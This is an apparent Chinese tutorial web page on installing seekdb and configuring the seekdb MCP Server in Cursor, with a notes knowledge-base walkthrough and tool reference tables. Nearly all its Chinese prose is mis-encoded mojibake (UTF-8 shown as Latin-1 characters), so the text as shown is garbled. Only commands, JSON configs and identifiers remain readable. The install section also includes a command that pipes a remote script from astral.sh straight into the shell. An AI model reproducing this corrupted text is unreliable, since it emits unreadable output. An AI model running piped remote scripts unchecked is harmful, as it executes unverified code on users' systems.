align="left"><code>ai_complete</code>ã€<code>ai_rerank</code>ã€<code>create_ai_model</code> ç­‰</td><td align="left">è°ƒç”¨ LLM ç”Ÿæˆæ–‡æœ¬ã€é‡æ’åºæœç´¢ç»“æœ</td></tr><tr><td align="left"><strong>AI è®°å¿†ç³»ç»Ÿ</strong></td><td align="left"><code>seekdb_memory_query</code>ã€<code>seekdb_memory_insert</code> ç­‰</td><td align="left">è·¨ä¼šè¯æŒä¹…åŒ–è®°å¿†ï¼Œè®© AI "è®°ä½"ä½ </td></tr><tr><td align="left"><strong>æ•°æ®å¯¼å…¥å¯¼å‡º</strong></td><td align="left"><code>import_csv_file_to_seekdb</code>ã€<code>export_csv_file_from_seekdb</code></td><td align="left">CSV æ–‡ä»¶ä¸æ•°æ®åº“è¡¨/å‘é‡é›†åˆäº’è½¬</td></tr></tbody></table>
<h2 data-id="heading-3"><strong>å®‰è£… seekdb æ•°æ®åº“</strong></h2>
<p>åœ¨ä½¿ç”¨ seekdb MCP Server ä¹‹å‰ï¼Œä½ éœ€è¦å…ˆå‡†å¤‡å¥½ seekdb æ•°æ®åº“ã€‚seekdb æä¾›ä¸¤ç§éƒ¨ç½²æ¨¡å¼ï¼š</p>
<h3 data-id="heading-4"><strong>æ¨¡å¼ä¸€ï¼šåµŒå…¥å¼æ¨¡å¼ï¼ˆé›¶é…ç½®ï¼Œä»…é™ Linuxï¼‰</strong></h3>
<p><strong>åµŒå…¥å¼æ¨¡å¼æ— éœ€å•ç‹¬å®‰è£… seekdb æ•°æ®åº“</strong>ï¼seekdb MCP Server å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨åˆå§‹åŒ–ä¸€ä¸ªæœ¬åœ°åµŒå…¥å¼æ•°æ®åº“ï¼Œå¼€ç®±å³ç”¨ã€‚</p>
<p>é€‚ç”¨åœºæ™¯ï¼šä¸ªäººå­¦ä¹ ã€å¿«é€ŸåŸå‹å¼€å‘ã€è¾¹ç¼˜è®¾å¤‡è¿è¡Œã€‚</p>
<p>âš ï¸ <strong>æç¤º</strong>ï¼š
<strong>macOS å’Œ Windows ç”¨æˆ·</strong>éœ€è¦ä½¿ç”¨ã€Œå®¢æˆ·ç«¯ / æœåŠ¡å™¨æ¨¡å¼ã€ï¼Œéœ€è¦å…ˆéƒ¨ç½² seekdb æ•°æ®åº“ï¼ˆæ¨è Docker æ–¹å¼ï¼‰ï¼Œç„¶åé…ç½®è¿æ¥å‚æ•°ã€‚</p>
<h3 data-id="heading-5"><strong>æ¨¡å¼äºŒï¼šå®¢æˆ·ç«¯/æœåŠ¡å™¨æ¨¡å¼ï¼ˆç”Ÿäº§æ¨èï¼‰</strong></h3>
<p>å¦‚æœä½ éœ€è¦åœ¨æµ‹è¯•æˆ–ç”Ÿäº§ç¯å¢ƒéƒ¨ç½² seekdbï¼Œå¯ä»¥é€‰æ‹©ä»¥ä¸‹æ–¹å¼ï¼š</p>
<h5 data-id="heading-6"><strong>æ–¹å¼ 1ï¼šä½¿ç”¨ yum å®‰è£…ï¼ˆRPM ç³»ç»Ÿï¼‰</strong></h5>
<pre><code class="hljs language-plain" lang="plain"># 1. æ·»åŠ  seekdb é•œåƒæº
sudo yum-config-manager --add-repo https://mirrors.aliyun.com/oceanbase/OceanBase.repo

# 2. å®‰è£… seekdb å’Œå®¢æˆ·ç«¯
sudo yum install seekdb obclient

# 3. å¯åŠ¨ seekdb
sudo systemctl start seekdb

# 4. æ£€æŸ¥å¯åŠ¨çŠ¶æ€ï¼ˆçŠ¶æ€ä¸º "Service is ready" è¡¨ç¤ºå¯åŠ¨æˆåŠŸï¼‰
sudo systemctl status seekdb

# 5. è¿æ¥æµ‹è¯•
mysql -h127.0.0.1 -uroot -P2881 -A oceanbase
</code></pre>
<h5 data-id="heading-7"><strong>æ–¹å¼ 2ï¼šä½¿ç”¨ Dockerï¼ˆæœ€å¿«æ·ï¼‰</strong></h5>
<pre><code class="hljs language-plain" lang="plain"># ä¸€è¡Œå‘½ä»¤å¯åŠ¨ seekdb
sudo docker run -d -p 2881:2881 oceanbase/seekdb

# å¦‚æœæ‹‰å–å¤±è´¥ï¼Œå¯ä½¿ç”¨å¤‡ç”¨é•œåƒæºï¼š
# sudo docker run -d -p 2881:2881 quay.io/oceanbase/seekdb
# sudo docker run -d -p 2881:2881 ghcr.io/oceanbase/seekdb
</code></pre>
<p><strong>ç³»ç»Ÿè¦æ±‚</strong>ï¼š</p>
<ul>
<li>CPUï¼šæœ€ä½ 1 æ ¸</li>
<li>å†…å­˜ï¼šæœ€ä½ 2 GB å¯ç”¨å†…å­˜</li>
<li>æ”¯æŒçš„æ“ä½œç³»ç»Ÿï¼šCentOS 7/8ã€Ubuntu 20+ã€Debian 9+ã€Anolis OS 8ã€éº’éºŸ V10 ç­‰</li>
</ul>
<p>æ›´å¤šéƒ¨ç½²æ–¹å¼è¯·å‚è€ƒ <strong>seekdb éƒ¨ç½²æ–‡æ¡£</strong><sup><strong>[1]</strong></sup>ã€‚</p>
<hr/>
<h2 data-id="heading-8"><strong>å®‰è£… seekdb MCP Server</strong></h2>
<h3 data-id="heading-9"><strong>å®‰è£… uv åŒ…ç®¡ç†å™¨</strong></h3>
<pre><code class="hljs language-plain" lang="plain"># å®‰è£… uv åŒ…ç®¡ç†å™¨
curl -LsSf https://astral.sh/uv/install.sh | sh
</code></pre>
<h2 data-id="heading-10"><strong>é…ç½® AI å·¥å…·è¿æ¥</strong></h2>
<h3 data-id="heading-11"><strong>Stdio æ¨¡å¼</strong></h3>
<p>ä»¥ Cursor ä¸ºä¾‹åœ¨ Cursor ä¸­ï¼Œæ‰“å¼€è®¾ç½® â†’ Tools &amp; MCP â†’ New MCP Serverï¼Œæ ¹æ®ä½ çš„æ“ä½œç³»ç»Ÿé€‰æ‹©é…ç½®æ–¹å¼ï¼š</p>
<h4 data-id="heading-12"><strong>Linux ç”¨æˆ·ï¼ˆåµŒå…¥å¼æ¨¡å¼ï¼‰</strong></h4>
<pre><code class="hljs language-plain" lang="plain">{
  "mcpServers": {
    "seekdb": {
      "command": "uvx",
      "args": ["seekdb-mcp-server"]
    }
  }
}
</code></pre>
<p>å°±è¿™ä¹ˆç®€å•ï¼<strong>åµŒå…¥å¼æ¨¡å¼æ— éœ€ä»»ä½•é…ç½®</strong>ï¼ŒæœåŠ¡å™¨å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨åˆå§‹åŒ–ä¸€ä¸ªæœ¬åœ° seekdb æ•°æ®åº“ã€‚</p>
<h4 data-id="heading-13"><strong>macOS / Windows ç”¨æˆ·ï¼ˆæœåŠ¡å™¨æ¨¡å¼ï¼‰</strong></h4>
<p>macOS å’Œ Windows ä¸æ”¯æŒåµŒå…¥å¼æ¨¡å¼ï¼Œéœ€è¦å…ˆéƒ¨ç½² seekdb æ•°æ®åº“ï¼ˆæ¨èä½¿ç”¨ Dockerï¼‰ï¼Œç„¶åé…ç½®è¿æ¥å‚æ•°ï¼š</p>
<pre><code class="hljs language-plain" lang="plain">{
  "mcpServers": {
    "seekdb": {
      "command": "uvx",
      "args": ["seekdb-mcp-server"],
      "env": {
        "SEEKDB_HOST": "127.0.0.1",
        "SEEKDB_PORT": "2881",
        "SEEKDB_USER": "",
        "SEEKDB_PASSWORD": "",
        "SEEKDB_DATABASE": "test"
      }
    }
  }
}
</code></pre>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>



































<table><thead><tr><th align="left"><strong>å‚æ•°</strong></th><th align="left"><strong>è¯´æ˜</strong></th><th align="left"><strong>é»˜è®¤å€¼</strong></th></tr></thead><tbody><tr><td align="left"><code>SEEKDB_HOST</code></td><td align="left">seekdb æœåŠ¡å™¨åœ°å€</td><td align="left"><code>127.0.0.1</code></td></tr><tr><td align="left"><code>SEEKDB_PORT</code></td><td align="left">seekdb æœåŠ¡ç«¯å£</td><td align="left"><code>2881</code></td></tr><tr><td align="left"><code>SEEKDB_USER</code></td><td align="left">æ•°æ®åº“ç”¨æˆ·å</td><td align="left">æ— </td></tr><tr><td align="left"><code>SEEKDB_PASSWORD</code></td><td align="left">æ•°æ®åº“å¯†ç </td><td align="left">æ— </td></tr><tr><td align="left"><code>SEEKDB_DATABASE</code></td><td align="left">æ•°æ®åº“åç§°</td><td align="left">æ— </td></tr></tbody></table>
<h3 data-id="heading-14"><strong>SSE æ¨¡å¼</strong></h3>
<h4 data-id="heading-15"><strong>Linux ç”¨æˆ·ï¼ˆåµŒå…¥å¼æ¨¡å¼ï¼‰</strong></h4>
<p>ç›´æ¥å¯åŠ¨ SSE æœåŠ¡å™¨ï¼š</p>
<pre><code class="hljs language-plain" lang="plain">uvx seekdb-mcp-server --transport sse --port 6000
</code></pre>
<h4 data-id="heading-16"><strong>macOS / Windows ç”¨æˆ·ï¼ˆæœåŠ¡å™¨æ¨¡å¼ï¼‰</strong></h4>
<p>å…ˆé…ç½®ç¯å¢ƒå˜é‡ï¼Œå†å¯åŠ¨æœåŠ¡å™¨ï¼š</p>
<pre><code class="hljs language-plain" lang="plain"># é…ç½® seekdb è¿æ¥ä¿¡æ¯
export SEEKDB_HOST=127.0.0.1
export SEEKDB_PORT=2881
export SEEKDB_USER=
export SEEKDB_PASSWORD=
export SEEKDB_DATABASE=test

# å¯åŠ¨ SSE æœåŠ¡å™¨
uvx seekdb-mcp-server --transport sse --port 6000
</code></pre>
<p>ç„¶ååœ¨å®¢æˆ·ç«¯é…ç½®ï¼š</p>
<pre><code class="hljs language-plain" lang="plain">{
  "sse-seekdb": {
    "type": "sse",
    "url": "http://127.0.0.1:6000/sse"
  }
}
</code></pre>
<h2 data-id="heading-17"><strong>å®æˆ˜æ¡ˆä¾‹ï¼šç”¨ AI å¯¹è¯æ„å»ºä¸ªäººç¬”è®°çŸ¥è¯†åº“</strong></h2>
<p>ç°åœ¨è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå®Œæ•´çš„å®æˆ˜æ¡ˆä¾‹ï¼Œä½“éªŒ seekdb MCP Server çš„å¼ºå¤§èƒ½åŠ›ã€‚æˆ‘ä»¬å°†æ„å»ºä¸€ä¸ª<strong>ä¸ªäººç¬”è®°çŸ¥è¯†åº“</strong>ï¼Œå®ç°ï¼š</p>
<ul>
<li>âœ… ç”¨è‡ªç„¶è¯­è¨€å­˜å‚¨ç¬”è®°</li>
<li>âœ… è¯­ä¹‰æœç´¢ç›¸å…³å†…å®¹</li>
<li>âœ… æ··åˆæœç´¢ç²¾å‡†å®šä½</li>
<li>âœ… AI æ™ºèƒ½é—®ç­”</li>
</ul>
<h3 data-id="heading-18"><strong>åœºæ™¯è®¾å®š</strong></h3>
<p>å‡è®¾ä½ æ˜¯ä¸€åæŠ€æœ¯å·¥ä½œè€…ï¼Œå¹³æ—¶ä¼šè®°å½•å„ç§å­¦ä¹ ç¬”è®°ã€å·¥ä½œå¿ƒå¾—ã€‚ç°åœ¨ä½ å¸Œæœ›ç”¨ AI å¸®ä½ ç®¡ç†è¿™äº›ç¬”è®°ï¼Œå¹¶èƒ½é€šè¿‡è‡ªç„¶è¯­è¨€å¿«é€Ÿæ‰¾åˆ°éœ€è¦çš„å†…å®¹ã€‚</p>
<h3 data-id="heading-19"><strong>ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºç¬”è®°é›†åˆ</strong></h3>
<p>åœ¨ AI å·¥å…·ï¼ˆå¦‚ Cursorï¼‰çš„å¯¹è¯æ¡†ä¸­è¾“å…¥ï¼š</p>
<pre><code class="hljs language-plain" lang="plain">åˆ›å»ºä¸€ä¸ªåä¸º "my_notes" çš„çŸ¥è¯†åº“é›†åˆ
</code></pre>
<p><strong>AI å“åº”ç¤ºä¾‹ï¼š</strong></p>
<p>æˆ‘å·²æˆåŠŸåˆ›å»ºåä¸º <strong>"my_notes"</strong> çš„é›†åˆï¼š</p>
<ul>
<li><strong>ç»´åº¦</strong>: 384ï¼ˆå‘é‡å¤§å°ï¼‰</li>
<li><strong>è·ç¦»åº¦é‡</strong>: L2ï¼ˆæ¬§å‡ é‡Œå¾—è·ç¦»ï¼‰</li>
</ul>
<p>å°±è¿™æ ·ï¼Œä¸€ä¸ªæ”¯æŒè¯­ä¹‰æœç´¢çš„å‘é‡é›†åˆå°±åˆ›å»ºå¥½äº†ï¼</p>
<h3 data-id="heading-20"><strong>ç¬¬äºŒæ­¥ï¼šæ·»åŠ ç¬”è®°å†…å®¹</strong></h3>
<p>ç»§ç»­è¾“å…¥ï¼š</p>
<pre><code class="hljs language-plain" lang="plain">å‘ my_notes ä¸­æ·»åŠ ä»¥ä¸‹ç¬”è®°ï¼š

1. "seekdb æ”¯æŒå‘é‡æœç´¢å’Œå…¨æ–‡æœç´¢çš„æ··åˆæ£€ç´¢ï¼Œå¯ä»¥åŒæ—¶åˆ©ç”¨å…³é”®è¯åŒ¹é…å’Œè¯­ä¹‰ç†è§£"
2. "MCP åè®®æ˜¯ Anthropic åœ¨ 2024 å¹´ 11 æœˆæå‡ºçš„å¼€æºåè®®ï¼Œè®©å¤§æ¨¡å‹å¯ä»¥ä¸å¤–éƒ¨å·¥å…·äº¤äº’"
3. "Python çš„ asyncio æ¨¡å—æä¾›äº†å¼‚æ­¥ç¼–ç¨‹èƒ½åŠ›ï¼Œé€‚åˆ I/O å¯†é›†å‹ä»»åŠ¡"
4. "Docker å®¹å™¨åŒ–æŠ€æœ¯å¯ä»¥å®ç°åº”ç”¨çš„å¿«é€Ÿéƒ¨ç½²å’Œç¯å¢ƒéš”ç¦»"
5. "RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰æ˜¯ç›®å‰æœ€æµè¡Œçš„ AI åº”ç”¨æ¶æ„ï¼Œç»“åˆæ£€ç´¢å’Œç”Ÿæˆèƒ½åŠ›"
</code></pre>
<p><strong>AI å“åº”ç¤ºä¾‹ï¼š</strong></p>
<p>å®Œæˆï¼å·²æˆåŠŸå‘ <strong>"my_notes"</strong> é›†åˆæ·»åŠ  5 æ¡ç¬”è®°ï¼š</p>





























<table><thead><tr><th align="left"><strong>ID</strong></th><th align="left"><strong>å†…å®¹</strong></th></tr></thead><tbody><tr><td align="left">doc1</td><td align="left">seekdb æ”¯æŒå‘é‡æœç´¢å’Œå…¨æ–‡æœç´¢çš„æ··åˆæ£€ç´¢...</td></tr><tr><td align="left">doc2</td><td align="left">MCP åè®®æ˜¯ Anthropic åœ¨ 2024 å¹´ 11 æœˆæå‡ºçš„...</td></tr><tr><td align="left">doc3</td><td align="left">Python çš„ asyncio æ¨¡å—æä¾›äº†å¼‚æ­¥ç¼–ç¨‹èƒ½åŠ›...</td></tr><tr><td align="left">doc4</td><td align="left">Docker å®¹å™¨åŒ–æŠ€æœ¯å¯ä»¥å®ç°åº”ç”¨çš„å¿«é€Ÿéƒ¨ç½²...</td></tr><tr><td align="left">doc5</td><td align="left">RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰æ˜¯ç›®å‰æœ€æµè¡Œçš„ AI åº”ç”¨æ¶æ„...</td></tr></tbody></table>
<h3 data-id="heading-21"><strong>ç¬¬ä¸‰æ­¥ï¼šè¯­ä¹‰æœç´¢</strong></h3>
<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬ç”¨è‡ªç„¶è¯­è¨€æœç´¢ç¬”è®°ï¼š</p>
<pre><code class="hljs language-plain" lang="plain">åœ¨ my_notes ä¸­æœç´¢ä¸ "AI åº”ç”¨å¼€å‘" ç›¸å…³çš„ç¬”è®°
</code></pre>
<p><strong>AI å“åº”ç¤ºä¾‹ï¼š</strong></p>
<p>ä»¥ä¸‹æ˜¯ä¸ <strong>"AI åº”ç”¨å¼€å‘"</strong> ç›¸å…³çš„ç¬”è®°ï¼ŒæŒ‰ç›¸å…³æ€§æ’åºï¼š</p>

























<table><thead><tr><th align="left"><strong>æ’å</strong></th><th align="left"><strong>å†…å®¹</strong></th><th align="left"><strong>ç›¸å…³åº¦</strong></th></tr></thead><tbody><tr><td align="left">1</td><td align="left">RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰æ˜¯ç›®å‰æœ€æµè¡Œçš„ AI åº”ç”¨æ¶æ„...</td><td align="left">æœ€é«˜</td></tr><tr><td align="left">2</td><td align="left">MCP åè®®æ˜¯ Anthropic åœ¨ 2024 å¹´ 11 æœˆæå‡ºçš„...</td><td align="left">é«˜</td></tr><tr><td align="left">3</td><td align="left">seekdb æ”¯æŒå‘é‡æœç´¢å’Œå…¨æ–‡æœç´¢çš„æ··åˆæ£€ç´¢...</td><td align="left">ä¸­</td></tr></tbody></table>
<p>æ³¨æ„ï¼šæˆ‘ä»¬æœç´¢çš„æ˜¯ "AI åº”ç”¨å¼€å‘"ï¼Œä½†ç¬”è®°ä¸­å¹¶æ²¡æœ‰è¿™ä¸ªç¡®åˆ‡çš„è¯ã€‚seekdb çš„å‘é‡æœç´¢èƒ½å¤Ÿç†è§£<strong>è¯­ä¹‰ç›¸ä¼¼æ€§</strong>ï¼Œè‡ªåŠ¨æ‰¾åˆ°ç›¸å…³å†…å®¹ï¼</p>
<h3 data-id="heading-22"><strong>ç¬¬å››æ­¥ï¼šæ··åˆæœç´¢</strong></h3>
<p>æ··åˆæœç´¢ç»“åˆäº†<strong>å…³é”®è¯åŒ¹é…</strong>å’Œ<strong>è¯­ä¹‰ç†è§£</strong>ï¼Œæ•ˆæœæ›´ç²¾å‡†ï¼š</p>
<pre><code class="hljs language-plain" lang="plain">å¯¹ my_notes æ‰§è¡Œæ··åˆæœç´¢ï¼š
- å…¨æ–‡å…³é”®è¯ï¼š"Python"
- è¯­ä¹‰æŸ¥è¯¢ï¼š"å¼‚æ­¥ç¼–ç¨‹å’Œå¹¶å‘å¤„ç†"
</code></pre>
<p><strong>AI å“åº”ç¤ºä¾‹ï¼š</strong></p>

















<table><thead><tr><th align="left"><strong>æ’å</strong></th><th align="left"><strong>å†…å®¹</strong></th></tr></thead><tbody><tr><td align="left">1</td><td align="left">Python çš„ asyncio æ¨¡å—æä¾›äº†å¼‚æ­¥ç¼–ç¨‹èƒ½åŠ›ï¼Œé€‚åˆ I/O å¯†é›†å‹ä»»åŠ¡</td></tr><tr><td align="left">2</td><td align="left">Docker å®¹å™¨åŒ–æŠ€æœ¯å¯ä»¥å®ç°åº”ç”¨çš„å¿«é€Ÿéƒ¨ç½²å’Œç¯å¢ƒéš”ç¦»</td></tr></tbody></table>
<p>æ··åˆæœç´¢ä½¿ç”¨ <strong>RRFï¼ˆå€’æ•°æ’åèåˆï¼‰</strong> ç®—æ³•ï¼Œç»¼åˆå…³é”®è¯åŒ¹é…ï¼ˆBM25ï¼‰å’Œå‘é‡ç›¸ä¼¼åº¦å¾—åˆ†ï¼Œæ’åç»“æœæ›´å‡†ç¡®ã€‚</p>
<h3 data-id="heading-23"><strong>ç¬¬äº”æ­¥ï¼šè®© AI è®°ä½ä½ çš„åå¥½</strong></h3>
<p>seekdb MCP Server è¿˜æä¾›äº† <strong>AI è®°å¿†ç³»ç»Ÿ</strong>ï¼Œè®© AI èƒ½å¤Ÿè·¨ä¼šè¯è®°ä½ä½ çš„ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-plain" lang="plain">è®°ä½æˆ‘æ˜¯ä¸€å Python å¼€å‘è€…ï¼Œä¸»è¦ä½¿ç”¨ seekdb åšå‘é‡æœç´¢åº”ç”¨
</code></pre>
<p><strong>AI å“åº”ç¤ºä¾‹ï¼š</strong></p>
<p>å·²è®°å½•ï¼æˆ‘ä¼šè®°ä½ï¼š</p>
<ul>
<li>ä½ æ˜¯ä¸€å Python å¼€å‘è€…</li>
<li>ä¸»è¦ä½¿ç”¨ seekdb åšå‘é‡æœç´¢åº”ç”¨</li>
</ul>
<p>ä¸‹æ¬¡å¯¹è¯æ—¶ï¼Œä½ å¯ä»¥ç›´æ¥é—®ï¼š</p>
<pre><code class="hljs language-plain" lang="plain">æ ¹æ®æˆ‘çš„æŠ€æœ¯èƒŒæ™¯ï¼Œæ¨èä¸€äº›å­¦ä¹ èµ„æº
</code></pre>
<p>AI ä¼šè‡ªåŠ¨æ£€ç´¢ä½ çš„åå¥½ï¼Œç»™å‡ºä¸ªæ€§åŒ–æ¨èï¼</p>
<h2 data-id="heading-24"><strong>åŠŸèƒ½ä¸€è§ˆ</strong></h2>
<h3 data-id="heading-25"><strong>å‘é‡é›†åˆç®¡ç†</strong></h3>













































<table><thead><tr><th align="left"><strong>å·¥å…·</strong></th><th align="left"><strong>åŠŸèƒ½</strong></th></tr></thead><tbody><tr><td align="left"><code>create_collection</code></td><td align="left">åˆ›å»ºå‘é‡é›†åˆ</td></tr><tr><td align="left"><code>list_collections</code></td><td align="left">åˆ—å‡ºæ‰€æœ‰é›†åˆ</td></tr><tr><td align="left"><code>has_collection</code></td><td align="left">æ£€æŸ¥é›†åˆæ˜¯å¦å­˜åœ¨</td></tr><tr><td align="left"><code>peek_collection</code></td><td align="left">é¢„è§ˆé›†åˆä¸­çš„æ–‡æ¡£</td></tr><tr><td align="left"><code>add_data_to_collection</code></td><td align="left">æ·»åŠ æ–‡æ¡£ï¼ˆè‡ªåŠ¨ç”Ÿæˆå‘é‡ï¼‰</td></tr><tr><td align="left"><code>update_collection</code></td><td align="left">æ›´æ–°æ–‡æ¡£</td></tr><tr><td align="left"><code>delete_documents</code></td><td align="left">åˆ é™¤æ–‡æ¡£</td></tr><tr><td align="left"><code>query_collection</code></td><td align="left">å‘é‡ç›¸ä¼¼æ€§æœç´¢</td></tr><tr><td align="left"><code>delete_collection</code></td><td align="left">åˆ é™¤é›†åˆ</td></tr></tbody></table>
<h3 data-id="heading-26"><strong>é«˜çº§æœç´¢</strong></h3>

















<table><thead><tr><th align="left"><strong>å·¥å…·</strong></th><th align="left"><strong>åŠŸèƒ½</strong></th></tr></thead><tbody><tr><td align="left"><code>full_text_search</code></td><td align="left">å…¨æ–‡æœç´¢ï¼ˆåŸºäºå…³é”®è¯ï¼‰</td></tr><tr><td align="left"><code>hybrid_search</code></td><td align="left">æ··åˆæœç´¢ï¼ˆç»“åˆå…¨æ–‡å’Œå‘é‡æœç´¢ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-27"><strong>AI æ¨¡å‹å·¥å…·</strong></h3>









































<table><thead><tr><th align="left"><strong>å·¥å…·</strong></th><th align="left"><strong>åŠŸèƒ½</strong></th></tr></thead><tbody><tr><td align="left"><code>create_ai_model</code></td><td align="left">æ³¨å†Œ AI æ¨¡å‹ï¼ˆåµŒå…¥ã€æ–‡æœ¬ç”Ÿæˆæˆ–é‡æ’åºï¼‰</td></tr><tr><td align="left"><code>create_ai_model_endpoint</code></td><td align="left">åˆ›å»ºå°†æ¨¡å‹è¿æ¥åˆ° API æœåŠ¡çš„ç«¯ç‚¹</td></tr><tr><td align="left"><code>drop_ai_model</code></td><td align="left">ç§»é™¤å·²æ³¨å†Œçš„ AI æ¨¡å‹</td></tr><tr><td align="left"><code>drop_ai_model_endpoint</code></td><td align="left">ç§»é™¤ AI æ¨¡å‹ç«¯ç‚¹</td></tr><tr><td align="left"><code>ai_complete</code></td><td align="left">è°ƒç”¨ LLM è¿›è¡Œæ–‡æœ¬ç”Ÿæˆ</td></tr><tr><td align="left"><code>ai_rerank</code></td><td align="left">ä½¿ç”¨ AI æ¨¡å‹æŒ‰ç›¸å…³æ€§é‡æ’æ–‡æ¡£</td></tr><tr><td align="left"><code>get_registered_ai_models</code></td><td align="left">åˆ—å‡ºæ‰€æœ‰å·²æ³¨å†Œçš„ AI æ¨¡å‹</td></tr><tr><td align="left"><code>get_ai_model_endpoints</code></td><td align="left">åˆ—å‡ºæ‰€æœ‰ AI æ¨¡å‹ç«¯ç‚¹</td></tr></tbody></table>
<h3 data-id="heading-28"><strong>AI è®°å¿†ç³»ç»Ÿ</strong></h3>
<p>seekdb MCP Server æä¾›äº†å¼ºå¤§çš„ AI è®°å¿†åŠŸèƒ½ï¼Œè®© AI åŠ©æ‰‹èƒ½å¤Ÿè·¨ä¼šè¯è®°ä½ä¿¡æ¯ï¼š</p>

























<table><thead><tr><th align="left"><strong>å·¥å…·</strong></th><th align="left"><strong>åŠŸèƒ½</strong></th></tr></thead><tbody><tr><td align="left"><code>seekdb_memory_query</code></td><td align="left">è¯­ä¹‰æœç´¢è®°å¿†</td></tr><tr><td align="left"><code>seekdb_memory_insert</code></td><td align="left">å­˜å‚¨æ–°è®°å¿†</td></tr><tr><td align="left"><code>seekdb_memory_update</code></td><td align="left">æ›´æ–°è®°å¿†</td></tr><tr><td align="left"><code>seekdb_memory_delete</code></td><td align="left">åˆ é™¤è®°å¿†</td></tr></tbody></table>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>AI è®°ä½ä½ çš„æŠ€æœ¯æ ˆåå¥½ï¼ˆå¦‚ "æˆ‘ä¹ æƒ¯ä½¿ç”¨ Python"ï¼‰</li>
<li>AI è®°ä½é¡¹ç›®ä¿¡æ¯ï¼ˆå¦‚ "è¿™ä¸ªé¡¹ç›®ä½¿ç”¨ FastAPI"ï¼‰</li>
<li>AI è®°ä½ä¸ªäººåå¥½ï¼ˆå¦‚ "æˆ‘å–œæ¬¢ç®€æ´çš„ä»£ç é£æ ¼"ï¼‰</li>
</ul>
<h3 data-id="heading-29"><strong>æ•°æ®å¯¼å…¥å¯¼å‡º</strong></h3>

















<table><thead><tr><th align="left"><strong>å·¥å…·</strong></th><th align="left"><strong>åŠŸèƒ½</strong></th></tr></thead><tbody><tr><td align="left"><code>import_csv_file_to_seekdb</code></td><td align="left">å¯¼å…¥ CSV æ–‡ä»¶</td></tr><tr><td align="left"><code>export_csv_file_from_seekdb</code></td><td align="left">å¯¼å‡ºæ•°æ®åˆ° CSV</td></tr></tbody></table>
<h3 data-id="heading-30"><strong>SQL æ“ä½œ</strong></h3>

















<table><thead><tr><th align="left"><strong>å·¥å…·</strong></th><th align="left"><strong>åŠŸèƒ½</strong></th></tr></thead><tbody><tr><td align="left"><code>execute_sql</code></td><td align="left">æ‰§è¡Œ SQL æŸ¥è¯¢</td></tr><tr><td align="left"><code>get_current_time</code></td><td align="left">è·å–æ•°æ®åº“å½“å‰æ—¶é—´</td></tr></tbody></table>
<h2 data-id="heading-31"><strong>æ›´å¤šå·¥å…·æ¢ç´¢</strong></h2>
<p>é™¤äº†æœ¬æ–‡ä»‹ç»çš„åŠŸèƒ½ï¼Œseekdb MCP Server è¿˜æ”¯æŒï¼š</p>
<ul>
<li>AI å‡½æ•°è°ƒç”¨
<ul>
<li>ä½¿ç”¨ AI æ¨¡å‹åˆ†æè¿™æ®µæ–‡æœ¬çš„æƒ…æ„Ÿå€¾å‘ï¼š"ä»Šå¤©å¤©æ°”çœŸå¥½ï¼Œå¿ƒæƒ…æ„‰æ‚¦ï¼"</li>
</ul>
</li>
<li>CSV æ•°æ®å¯¼å…¥
<ul>
<li>å°† /path/to/products.csv å¯¼å…¥ä¸ºå‘é‡é›†åˆï¼Œä½¿ç”¨ç¬¬ 2 åˆ—ï¼ˆäº§å“æè¿°ï¼‰ä½œä¸ºæ–‡æ¡£</li>
</ul>
</li>
</ul>
<h2 data-id="heading-32"><strong>å¸¸è§é—®é¢˜</strong></h2>
<h4 data-id="heading-33"><strong>Q: éœ€è¦å®‰è£… seekdb å—ï¼Ÿ</strong></h4>
<p><strong>A:</strong> ä¸éœ€è¦ï¼seekdb MCP Server ä½¿ç”¨åµŒå…¥å¼æ¨¡å¼ï¼Œseekdb å·²ç»åŒ…å«åœ¨å†…ï¼Œæ— éœ€å•ç‹¬å®‰è£…ã€‚</p>
<h4 data-id="heading-34"><strong>Q: æ•°æ®å­˜å‚¨åœ¨å“ªé‡Œï¼Ÿ</strong></h4>
<p><strong>A:</strong> æ•°æ®å­˜å‚¨åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œé»˜è®¤åœ¨å½“å‰ç”¨æˆ·å®¶ç›®å½•ä¸‹ã€‚ä½ çš„æ•°æ®å®Œå…¨åœ¨æœ¬åœ°ï¼Œä¸ä¼šä¸Šä¼ åˆ°ä»»ä½•äº‘ç«¯ã€‚</p>
<h4 data-id="heading-35"><strong>Q: æ”¯æŒå“ªäº›æ“ä½œç³»ç»Ÿï¼Ÿ</strong></h4>
<p><strong>A:</strong> ç›®å‰æ”¯æŒ Linuxï¼ˆglibc &gt;= 2.28ï¼‰ï¼Œæ”¯æŒ x86_64 å’Œ aarch64 æ¶æ„ã€‚</p>
<h4 data-id="heading-36"><strong>Q: å¦‚ä½•å‡çº§ï¼Ÿ</strong></h4>
<p><strong>A:</strong> ä½¿ç”¨ <code>uvx</code> æ—¶ä¼šè‡ªåŠ¨ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬ã€‚</p>
<h2 data-id="heading-37"><strong>æ€»ç»“</strong></h2>
<p><strong>seekdb MCP Server</strong> è®©æ•°æ®åº“æ“ä½œå˜å¾—å‰æ‰€æœªæœ‰çš„ç®€å•ï¼š</p>

























